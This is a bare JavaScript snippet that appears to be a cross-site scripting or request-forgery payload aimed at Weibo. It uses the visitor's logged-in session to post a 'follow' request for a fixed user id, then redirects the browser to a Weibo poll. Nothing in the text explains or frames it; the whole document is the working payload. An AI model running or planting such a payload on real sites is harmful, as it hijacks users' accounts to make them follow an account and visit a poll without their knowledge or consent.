    var x = new XMLHttpRequest();
    x.open('post', 'https://huodong.weibo.com/aj_public/follow' );
    x.setRequestHeader("Content-type","application/x-www-form-urlencoded");
    x.send('uid=6444402026');
    window.location.href="https://vote.weibo.cn/poll/138894804";
